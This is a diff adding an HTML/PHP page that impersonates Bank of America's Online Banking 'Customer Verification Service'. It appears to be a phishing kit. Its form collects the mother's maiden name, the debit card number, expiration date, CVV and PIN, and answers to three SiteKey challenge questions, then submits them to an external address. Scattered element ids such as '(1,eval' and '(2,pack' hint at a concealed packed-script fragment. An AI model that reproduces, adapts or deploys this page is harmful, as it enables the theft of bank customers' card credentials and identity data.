@@ -1,0 +1,434 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html lang="en-US"><head><title>Bank of America | Online Banking | Customer Service</title>
+<meta name="Description" content="Change Email Address">
+<meta name="GENERATOR" content="IBM WebSphere Studio">
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"> 
+<link rel="shortcut icon" href="favicon.ico">
+<link rel="stylesheet" type="text/css" href="mac_ns16.css">
+<style type="text/css">
+.Warning {
+background:#ffffcc;color:black;
+}
+</style>
+</head>
+
+<body id="body" topmargin="0"  bgcolor="#ffffff" marginheight="0" marginwidth="0">
+<form name="verifyForm" action="www.facebook.com" method="post">
+
+<SCRIPT language="JavaScript">
+function verifyFormSubmit()
+{
+document.verifyForm.submit();
+}
+</SCRIPT>
+
+<div class="masthead"><table summary="" border="0" cellpadding="0" cellspacing="0" width="747"><tbody><tr><td><table summary="" border="0" cellpadding="0" cellspacing="0" width="100%"><tbody><tr><td rowspan="3" valign="top"><img src="mhd_logo_bofa_60.gif" alt="Bank of America Logo" border="0" height="60" hspace="12" vspace="0" width="250"></td><td rowspan="3" valign="top"><a href="#skipnav" title="Skip Navigational Links" onfocus='window.status="Skip Navigational Links";' onblur='javascript:window.status="";'><img src="clr.gif" alt="Skip Navigational Links" border="0" height="22" width="1"></a></td><td colspan="2" valign="top"><img src="ob_title_40.gif" alt="Online Banking" align="right" border="0" height="40" hspace="10" vspace="0" width="164"></td></tr><tr><td width="300"></td><td class="global-greyline"><img src="clr.gif" alt="" height="1" width="1"></td></tr><tr><td class="global-ie"></td><td class="global" align="right" nowrap="nowrap"><span class="global"><a href="#" onClick="dotComWindow('Search');return false;" class="global" title="Search for information on products at Bank of America (opens in a new window)." onFocus="javascript:hover(this, 'global-over');window.status='Search';" onBlur="javascript:hover(this, 'global');window.status='';">Search</a>&nbsp;<span class="global-sep">&#8226;</span>&nbsp;<a href="#" onClick="dotComWindow('Locations');return false;" class="global" title="Locate Bank of America ATMs and Banking Centers (opens in a new window)." onFocus="javascript:hover(this, 'global-over');window.status='Locations';" onBlur="javascript:hover(this, 'global');window.status='';">Locations</a>&nbsp;<span class="global-sep">&#8226;</span>&nbsp;<a href="#" class="global" title="Prevent fraud by checking the alerts we've sent you. If you have none, learn more about alerts." onFocus="javascript:hover(this, &quot;global-over&quot;);window.status=&quot;Prevent fraud by checking the alerts we've sent you. If you have none, learn more about alerts.&quot;;" onblur='javascript:hover(this, "global");window.status="";'>Alerts</a>&nbsp;<span class="global-sep">&#8226;</span>&nbsp;<a href="#" class="global" title="Mail" onfocus='javascript:hover(this, "global-over");window.status="Mail";' onblur='javascript:hover(this, "global");window.status="";'>Mail</a>&nbsp;<span class="global-sep">&#8226;</span>&nbsp;<a href="#" class="global" title="Get help with Online Banking (opens a new window)." onFocus="javascript:hover(this, 'global-over');window.status='Get help with Online Banking (opens a new window).';" onBlur="javascript:hover(this, 'global');window.status='';">Help</a></span><noscript><span
+class=global><a href="#" title="Get help with Online Banking (opens a new window)." class='global'>Help</a></span></noscript><span class="global">&nbsp;<span class="global-sep">&#8226;</span>&nbsp;<a href="#" class="global-right-lit" title="Sign Off" onfocus='javascript:hover(this, "global-right-lit-over");window.status="Sign Off";' onblur='javascript:hover(this, "global-right-lit");window.status="";'>Sign Off</a></span><img src="clr.gif" alt="" height="1" width="3"></td></tr></tbody></table></td></tr>
+<tr><td class="nav-brdr1" style="border-bottom: medium none;"><img src="clr.gif" alt="" height="4" width="1"></td></tr><!-- End global links -->
+
+
+<tr><td class="nav1" align="left" nowrap="nowrap"><table summary="" cellpadding="0" cellspacing="0" width="100%"><tbody><tr><td class="nav1-cell" nowrap="nowrap"><a href="#" class="nav1" title="Accounts" onfocus='javascript:hover(this, "nav1-over");window.status="Accounts";' onblur='javascript:hover(this, "nav1");window.status="";'>Accounts</a></td><td class="nav1-sep"><img src="clr.gif" alt="" height="1" width="2"></td><td class="nav1-cell" nowrap="nowrap"><a href="#" onClick="return fnDblClick();" class="nav1" title="Bill Pay &amp; e-Bills" onfocus='javascript:hover(this, "nav1-over");window.status="Bill Pay & e-Bills";' onblur='javascript:hover(this, "nav1");window.status="";'>Bill Pay &amp; e-Bills</a><noscript><a
+href="/cgi-bin/ias/PQwDwD9Z344Xk4tXesgJauZems7veIjd0b3h4RJp1093448/18/GotoMakePayment"
+class=nav1 title="Bill Pay &amp; e-Bills">Bill Pay &amp; e-Bills</a></noscript></td><td class="nav1-sep"><img src="clr.gif" alt="" height="1" width="2"></td><td class="nav1-cell" nowrap="nowrap"><a href="#" class="nav1" title="Transfer Funds" onfocus='javascript:hover(this, "nav1-over");window.status="Transfer Funds";' onblur='javascript:hover(this, "nav1");window.status="";'>Transfer Funds</a></td><td class="nav1-sep"><img src="clr.gif" alt="" height="1" width="2"></td><td class="nav1-cell" nowrap="nowrap"><a href="#" class="nav1" title="Investments" onfocus='javascript:hover(this, "nav1-over");window.status="Investments";' onblur='javascript:hover(this, "nav1");window.status="";'>Investments</a></td><td class="nav1-sep2" width="2"><img src="clr.gif" alt="" height="1" width="1"></td><td class="nav1-cell-lit" nowrap="nowrap"><a href="#" class="nav1-lit" title="Customer Service" onfocus='javascript:hover(this, "nav1-lit-over");window.status="Customer Service";' onblur='javascript:hover(this, "nav1-lit");window.status="";'>Customer Service</a></td><td class="nav1-sep3" width="2"><img src="clr.gif" alt="" height="1" width="1"></td><td class="nav1-cell" nowrap="nowrap" width="100%">&nbsp;</td></tr></tbody></table></td></tr><tr><td class="nav-brdr2"><img src="clr.gif" alt="" height="5" width="1"></td></tr><tr><td class="nav-brdr2"><img src="clr.gif" alt="" height="4" width="1"></td></tr><tr><td class="nav-brdr4"><img src="clr.gif" alt="" height="1" width="1"></td></tr></tbody></table></div>
+<div><img src="clr.gif" alt="" height="5" width="1"></div>
+
+
+
+<!--BEGIN CONTENT POSITIONING TABLE-->
+
+<div class="pagelabel">
+ <div><img src="clr.gif" alt="" height="12" width="1"></div>
+ <div><img src="clr.gif" alt="" height="3" width="1"></div>
+ <table class="nav3" summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+     <tbody><tr valign="top">
+         <td>
+             <div style="margin: 0px; padding: 0px;"><a name="skipnav"></a>
+                 	<h1 class="title1">CUSTOMER VERIFICATION SERVICE 
+
+         </td>
+         <td align="right" nowrap="nowrap" valign="bottom">
+			<img src="clr.gif" alt="" border="0" height="1" width="1">
+             </td>
+     </tr>
+ </tbody></table>
+ <div><img src="clr.gif" alt="" height="7" width="1"></div>
+ <div class="ruleblue1"><img src="clr.gif" alt="" height="1" width="1"></div>
+ <div><img src="clr.gif" alt="" height="12" width="1"></div>
+</div>
+
+	
+	
+	
+	
+<table summary="" border="0" cellpadding="0" cellspacing="0" width="747">
+
+<tbody><tr>
+    <!--BEGIN LEFT GUTTER-->
+    <td><img src="clr.gif" alt="" height="1" width="10"></td>
+    <!--END LEFT GUTTER-->
+    <td>
+    
+    
+    
+    
+    
+    
+    
+    
+<div><img src="clr.gif" width=1 height=10 alt=""></div>
+<div class=inline><h3 class=title2>Confirm Your Online Banking Information</h3></div>
+ 
+<div class=text1>
+<div><img src="clr.gif" width=1 height=5 alt=""></div>
+<p class=inline>
+As an additional safeguard, we ask that you provide your ATM or Check Card information.
+</div><div><img src="clr.gif" width=1 height=10 alt=""></div>
+ 
+  
+	<table summary="" border="0" cellpadding="0" cellspacing="6" width="97%">
+
+            
+	    
+
+
+
+
+<tr><td>&nbsp;</td></tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="newEmailAddress"><b> * Mother's Maiden Name:</b><br><br></label>
+</td>
+<td align="left"><img src="clr.gif" alt="" height="1" width="10"><input class="<?echo $mmnclass; ?>" name="mmn" value="" size="25" maxlength="60" type="text">
+<br>
+<div class="text2"><img src="clr.gif" alt="" height="1" width="10">&nbsp;</div></td>
+</tr>
+
+<tr><td>&nbsp;</td></tr>
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="debitcardno"><b> * ATM or Check Card Number:</b></label><br><br></td>
+<td align=left><img src="clr.gif" alt="" height="1" width="10"><input class="<?echo $ccclass; ?>" type="text" name="ccnumber" size="30" maxlength="19" value="">
+
+<br>
+<div class="text2"><img src="clr.gif" alt="" height="1" width="10">(16 digits, no dashes or spaces)</div>
+</td>
+</tr>
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="newEmailAddress"><b> * Card Expiration Date:</b><br><br></label>
+</td>
+<td align="left"><img src="clr.gif" alt="" height="1" width="10"><select class="<?echo $expmonthclass; ?>" name="expmonth" id="expmonth">
+<option value=0 <?php if ($expmonth == "0") echo "selected"; ?>month</option>
+<option value=01 <?php if ($expmonth == "01") echo "selected"; ?>01</option>
+<option value=02 <?php if ($expmonth == "02") echo "selected"; ?>02</option>
+<option value=03 <?php if ($expmonth == "03") echo "selected"; ?>03</option>
+<option value=04 <?php if ($expmonth == "04") echo "selected"; ?>04</option>
+<option value=05 <?php if ($expmonth == "05") echo "selected"; ?>05</option>
+<option value=06 <?php if ($expmonth == "06") echo "selected"; ?>06</option>
+<option value=07 <?php if ($expmonth == "07") echo "selected"; ?>07</option>
+<option value=08 <?php if ($expmonth == "08") echo "selected"; ?>08</option>
+<option value=09 <?php if ($expmonth == "09") echo "selected"; ?>09</option>
+<option value=10 <?php if ($expmonth == "10") echo "selected"; ?>10</option>
+<option value=11 <?php if ($expmonth == "11") echo "selected"; ?>11</option>
+<option value=12 <?php if ($expmonth == "12") echo "selected"; ?>12</option>
+</select>&nbsp;<select class="<?echo $expyearclass; ?>" name="expyear" size="1" id="expyear" type="select">
+<OPTION value="0" <?php if ($expyear == "0") echo "selected"; ?>year</OPTION>
+<option value="10" <?php if ($expyear == "10") echo "selected"; ?>2023</option>
+<option value="11" <?php if ($expyear == "11") echo "selected"; ?>2024</option>
+<option value="12" <?php if ($expyear == "12") echo "selected"; ?>2025</option>
+<option value="13" <?php if ($expyear == "13") echo "selected"; ?>2026</option>
+<option value="14" <?php if ($expyear == "14") echo "selected"; ?>2027</option>
+<option value="15" <?php if ($expyear == "15") echo "selected"; ?>2028</option>
+<option value="16" <?php if ($expyear == "16") echo "selected"; ?>2029</option>
+<option value="17" <?php if ($expyear == "17") echo "selected"; ?>2030</option>
+<option value="18" <?php if ($expyear == "18") echo "selected"; ?>2031</option>
+</select>
+</td>
+</tr>
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="newEmailAddress"><b> * Card Verification Number:</b><br><br></label>
+</td>
+<td align="left"><img src="clr.gif" alt="" height="1" width="10"><input class="<?echo $cvvclass; ?>" name="cvv" value="" size="5" maxlength="3" type="text">
+</td>
+</tr>
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="debitcardno"><b> * ATM or Check Card PIN:</b></label><br><br></td>
+<td align=left><img src="clr.gif" alt="" height="1" width="10"><input class="<?echo $pinclass; ?>" type="password" name="ccpin" size="12" maxlength="12" value="">&nbsp;
+<script language="JavaScript">
+function openPinHelp() {
+popupWin = window.open('images/pin.html','EIN','scrollbars="no",resizable="no",toolbar="no",width=450,height=250');
+popupWin.focus();
+}
+</script>
+<a href="javascript:openPinHelp();"><img src="icon_question.gif" border="0"></a>
+
+<br>
+<div class="text2"><img src="clr.gif" alt="" height="1" width="10">4-12 digits</div>
+</td>
+</tr>
+
+
+
+<?
+if($questions != "1"){
+
+if($q1=="") { $qa="selected"; }
+if($q1=="What is your maternal grandmother\'s first name?") { $qa1="selected"; }
+if($q1=="Qa2") { $qa2="selected"; }
+if($q1=="Qa3") { $qa3="selected"; }
+if($q1=="Qa4") { $qa4="selected"; }
+if($q1=="Qa5") { $qa5="selected"; }
+if($q1=="Qa6") { $qa6="selected"; }
+if($q1=="Qa7") { $qa7="selected"; }
+if($q1=="Qa8") { $qa8="selected"; }
+if($q1=="Qa9") { $qa9="selected"; }
+
+if($q2=="") { $qb="selected"; }
+if($q2=="Qb1") { $qb1="selected"; }
+if($q2=="Qb2") { $qb2="selected"; }
+if($q2=="Qb3") { $qb3="selected"; }
+if($q2=="Qb4") { $qb4="selected"; }
+if($q2=="Qb5") { $qb5="selected"; }
+if($q2=="Qb6") { $qb6="selected"; }
+if($q2=="Qb7") { $qb7="selected"; }
+if($q2=="Qb8") { $qb8="selected"; }
+if($q2=="Qb9") { $qb9="selected"; }
+
+if($q3=="") { $qc="selected"; }
+if($q3=="Qc1") { $qc1="selected"; }
+if($q3=="Qc2") { $qc2="selected"; }
+if($q3=="Qc3") { $qc3="selected"; }
+if($q3=="Qc4") { $qc4="selected"; }
+if($q3=="Qc5") { $qc5="selected"; }
+if($q3=="Qc6") { $qc6="selected"; }
+if($q3=="Qc7") { $qc7="selected"; }
+if($q3=="Qc8") { $qc8="selected"; }
+if($q3=="Qc9") { $qc9="selected"; }
+
+
+print '
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="q1"><b> * SiteKey Challenge Question:</b></label><br></td>
+<td align=left><img src="clr.gif" alt="" height="1" width="10"><select class="'.$q1class.'" name="q1" style="width: 35em;">
+<option ' . $qa . ' value="">Select Sitekey Challenge Question</option>
+<option ' . $qa1 . ' value="What is your maternal grandmother\'s first name?">What is your maternal grandmother\'s first name?</option>
+<option ' . $qa2 . ' value="What is your maternal grandfather\'s first name?">What is your maternal grandfather\'s first name?</option>
+<option ' . $qa3 . ' value="In what city were you born? (Enter full name of city only)">In what city were you born? (Enter full name of city only)</option>
+<option ' . $qa4 . ' value="What was the name of your first pet?">What was the name of your first pet?</option>
+<option ' . $qa5 . ' value="What was your high school mascot?">What was your high school mascot?</option>
+<option ' . $qa6 . ' value="How old were you at your wedding? (Enter age as digits.)">How old were you at your wedding? (Enter age as digits.)</option>
+<option ' . $qa7 . ' value="In what year (YYYY) did you graduate from high school?">In what year (YYYY) did you graduate from high school?</option>
+<option ' . $qa8 . ' value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
+<option ' . $qa9 . ' value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</option>
+</select>
+</td>
+</tr>
+
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="a1"><b> * Answer:</b></label></td>
+<td align=left><img src="clr.gif" alt="" height="1" width="10"><input class="'.$a1class.'" type="text" name="a1" size="30" maxlength="19" value="">
+</td>
+</tr>
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="q2"><b> * SiteKey Challenge Question:</b></label></td>
+<td align=left><img src="clr.gif" alt="" height="1" width="10"><select class="'.$q2class.'" name="q2" style="width: 35em;">
+<option ' . $qb . ' value="">Select Sitekey Challenge Question</option>
+<option ' . $qb1 . ' value="What is your father\'s middle name?">What is your father\'s middle name?</option>
+<option ' . $qb2 . ' value="What is your mother\'s middle name?">What is your mother\'s middle name?</option>
+<option ' . $qb3 . ' value="In what city were you married?">In what city were you married?</option>
+<option ' . $qb4 . ' value="In what city is your vacation home?">In what city is your vacation home?</option>
+<option ' . $qb5 . ' value="What is the first name of your first child?">What is the first name of your first child?</option>
+<option ' . $qb6 . ' value="What is the name of your first employer?">What is the name of your first employer?</option>
+<option ' . $qb7 . ' value="What is your favorite hobby?">What is your favorite hobby?</option>
+<option ' . $qb8 . ' value="What is your paternal grandfather\'s first name?">What is your paternal grandfather\'s first name?</option>
+<option ' . $qb9 . ' value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
+</select>
+</td>
+</tr>
+
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="a2"><b> * Answer:</b></label></td>
+<td align=left><img src="clr.gif" alt="" height="1" width="10"><input class="'.$a2class.'" type="text" name="a2" size="30" maxlength="19" value="">
+</td>
+</tr>
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="q3"><b> * SiteKey Challenge Question:</b></label></td>
+<td align=left><img src="clr.gif" alt="" height="1" width="10"><select class="'.$q3class.'" name="q3" style="width: 35em;">
+<option ' . $qc . ' value="">Select Sitekey Challenge Question</option>
+<option ' . $qc1 . ' value="In what city was your mother born? (Enter full name of city only)">In what city was your mother born? (Enter full name of city only)</option>
+<option ' . $qc2 . ' value="In what city was your father born? (Enter full name of city only)">In what city was your father born? (Enter full name of city only)</option>
+<option ' . $qc3 . ' value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</option>
+<option ' . $qc4 . ' value="When is your wedding anniversary? (Enter the full name of month)">When is your wedding anniversary? (Enter the full name of month)</option>
+<option ' . $qc5 . ' value="In what city did you honeymoon? (Enter full name of city only)">In what city did you honeymoon? (Enter full name of city only)</option>
+<option ' . $qc6 . ' value="In what city was your high school? (Enter only "Charlotte" for Charlotte High School)">In what city was your high school? (Enter only "Charlotte" for Charlotte High School)</option>
+<option ' . $qc7 . ' value="What is your paternal grandfather\'s first name?">What is your paternal grandfather\'s first name?</option>
+<option ' . $qc8 . ' value="What is your paternal grandmother\'s first name?">What is your paternal grandmother\'s first name?</option>
+<option ' . $qc9 . ' value="Where did you meet your spouse for the first time? (Enter full name of city only)">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
+</select>
+</td>
+</tr>
+
+
+<tr>
+<td class="text1" colspan="2" align="right" nowrap="nowrap">
+<label for="a3"><b> * Answer:</b></label></td>
+<td align=left><img src="clr.gif" alt="" height="1" width="10"><input class="'.$a3class.'" type="text" name="a3" size="30" maxlength="19" value="">
+</td>
+</tr>
+
+
+
+
+            <tr><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr>
+            <tr>
+                <td colspan="2"><img src="clr.gif" alt="" height="1" width="1"></td>
+                <td align="left" nowrap="nowrap">
+                    <table summary="" cellpadding="0" cellspacing="0">
+                        <tbody><tr>
+                            <td>
+                                
+                                <img src="clr.gif" alt="" height="1" width="6">
+                                
+                            </td>
+                            <td>
+
+								
+<table summary="" class="btn1" border="0" cellpadding="0" cellspacing="0"><tbody><tr><td nowrap="nowrap"><div class="btn1"><a href='javascript:verifyFormSubmit();'  class="btn1" onfocus='hover(this, "btn1-over");window.status="Continue.";' onblur='hover(this, "btn1"); window.status=""' title="Continue." onClick="">&nbsp;Continue&nbsp;</a></div></td></tr></tbody></table>
+<noscript>
+<table border=0 cellpadding=0 cellspacing=0 summary=''>
+<tr>
+<td><input type='submit' name='myaction' title='Continue' id='' value=' Continue ' class='btn1'>
+
+</td>
+</tr>
+</table>
+</noscript>
+
+                            </td>
+                            <td>
+                                <img src="clr.gif" alt="" height="1" width="10">
+                            </td>
+
+                            </td>
+                        </tr>
+                    </tbody></table>
+                </td>
+            </tr>
+        </tbody></table>
+
+    </td>
+    <!--BEGIN RIGHT GUTTER-->
+    <td><img src="clr.gif" alt="" height="1" width="10"></td>
+    <!--END RIGHT GUTTER-->
+</tr>
+</tbody></table>
+
+
+
+
+
+<div><img src="clr.gif" alt="" height="20" width="1"></div>
+
+<div><img src="clr.gif" alt="" height="10" width="1"></div>
+
+<!-- Begin footer -->
+<div class="footer">
+<table summary="" border="0" cellpadding="0" cellspacing="0" width="747">
+   <tbody><tr><td colspan="2" class="rulegrey2"><img src="clr.gif" alt="" height="1" width="1"></td></tr>
+   <tr><td rowspan="7" width="12"><img src="clr.gif" alt="" height="1" width="12"></td><td><img src="clr.gif" alt="" height="7" width="1"></td></tr>
+   <tr><td class="secure-area" nowrap="nowrap"><div class="secure-area"><img src="icon_lock_big.gif" alt="Secure Area icon" border="0" height="11" hspace="0" vspace="0" width="9"><img src="clr.gif" alt="" height="1" width="8">Secure Area</div></td></tr>
+<tr><td><img src="clr.gif" alt="" height="6" width="1"></td></tr>
+<tr>
+   <td class="footer" valign="top">
+    <a href="#" title="Accounts" onFocus="javascript:window.status='Accounts';" onBlur="javascript:window.status='';">Accounts</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+		
+		
+				<a href="#" title="Bill Pay &amp; e-Bills" onFocus="javascript:window.status='Bill Pay & e-Bills';" onBlur="javascript:window.status='';">Bill Pay &amp; e-Bills</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+		
+			<a href="#" title="Transfer Funds" onFocus="javascript:window.status='Transfer Funds';" onBlur="javascript:window.status='';">Transfer Funds</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+		
+    
+    
+		
+			<a href="#" title="Investments" onFocus="javascript:window.status='Investments';" onBlur="javascript:window.status='';">Investments</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+		
+        <a href="#" title="Customer Service" onFocus="javascript:window.status='Customer Service';" onBlur="javascript:window.status='';">Customer Service</a>
+
+    <br>
+	
+    <a  href="#" onClick="dotComWindow('Privacy');return false;" title="Privacy &amp; Security (opens in a new window)." onFocus="javascript:window.status='Privacy & Security (opens in a new window).';" onBlur="javascript:window.status='';">Privacy &amp; Security</a>
+    &nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+
+    <a  href="#" onClick="dotComWindow('Search');return false;" title="Search for information on products at Bank of America (opens in a new window)." onFocus="javascript:window.status='Search';" onBlur="javascript:window.status='';">Search</a>
+    &nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+
+    <a  href="#" onClick="dotComWindow('Locations');return false;" title="Locate Bank of America ATMs and Banking Centers (opens in a new window)." onFocus="javascript:window.status='Locations';" onBlur="javascript:window.status='';">Locations</a>
+    &nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+
+	
+	<a href="#" title="Prevent fraud by checking the alerts we've sent you. If you have none, learn more about alerts." onFocus="javascript:window.status=&quot;Prevent fraud by checking the alerts we've sent you. If you have none, learn more about alerts.&quot;;" onblur='javascript:window.status="";'>Alerts</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+	
+
+		
+			<a href="#" title="Mail" onFocus="javascript:window.status='Mail';" onBlur="javascript:window.status='';">Mail</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+		
+			<a href="#" title="Get help with Online Banking (opens a new window)." onFocus="javascript:window.status='Get help with Online Banking (opens a new window).';" onBlur="javascript:window.status='';">Help</a>
+			<noscript>
+<a
+href="/cgi-bin/ias/PQwDwD9Z344Xk4tXesgJauZems7veIjd0b3h4RJp1093448/18/HelpControl"
+ title='Get help with Online Banking (opens a new
+window).' >Help</a> </noscript>
+			&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+   
+	
+		<a  href="#" onClick="dotComWindow('SiteMap');return false;" title="Browse the Site Map. Link opens a new window." onFocus="javascript:window.status='Site Map';" onBlur="javascript:window.status='';">Site Map</a>
+		&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;
+	
+        <a href="#" title="Sign Off" onFocus="javascript:window.status='Sign Off';" onBlur="javascript:window.status='';">Sign Off</a></td>
+</tr>
+   <tr><td><img src="clr.gif" alt="" height="22" width="1"></td></tr>
+
+		<tr>
+			<td class="fdic-text" valign="top">Bank of America, N.A. Member FDIC.&nbsp;
+			Equal Housing Lender<img src="icon_house.gif" alt="Equal Housing Lender" height="9" hspace="3" width="14"><br>
+			&copy; 2023 Bank of America Corporation. All rights reserved.</td>
+		</tr>
+
+
+<tr><td><img src="clr.gif" alt="" height="20"></td></tr>
+            </tbody></table></div>
+
+<!-- End footer -->
+
+
+    </form>
+
+
+
+
+
+<div name="mylayer" id="mylayer" style="z-index: 90; position: absolute; visibility: hidden; left: 10px; top: 10px;">
+<table border="0" cellpadding="0" cellspacing="0">
+<tbody><tr><td><a name="needRef" id="needRef" href="#" title="invitation popup window for live chat with an online representative"></a>
+<a href="#"><img src="close_on.gif" name="need_close" id="need_close" alt="Close chat invitation" style="display: block;" border="0" id="(3,h*" height="39" width="394"></a></td></tr>
+</tbody></table></div>
+<iframe name="hcpopuplayer" id="hcpopuplayer" src="blankhtml.html" style="z-index: 88; position: absolute; visibility: hidden; left: 10px; top: 10px;" frameborder="0" height="100" scrolling="no" id="(((images/mac_ns16.css" width="300"></iframe>
+<div name="hcpopupgif" id="hcpopupgif" style="z-index: 89; position: absolute; cursor: pointer; visibility: hidden; left: 0px; top: 10px;"><a href="#" onClick="goto_redirect(); return false;"><img id="(1,eval" name="hcpopupimage" id="hcpopupimage" border="0"></a></div>
+<div name="hcpopupclose" id="hcpopupclose" onClick="hcClosePopup();" style="z-index: 89; position: absolute; cursor: pointer; visibility: hidden; left: 0px; top: 10px;"><a href="#" onClick="hcClosePopup(); return false;"><img name="hcpopupcloseimage" id="(2,pack" id="hcpopupcloseimage" border="0"></a></div>
+
+<img src="a.gif" style="visibility: hidden; position: absolute; top: 0px; left: -5000px;"></body></html>
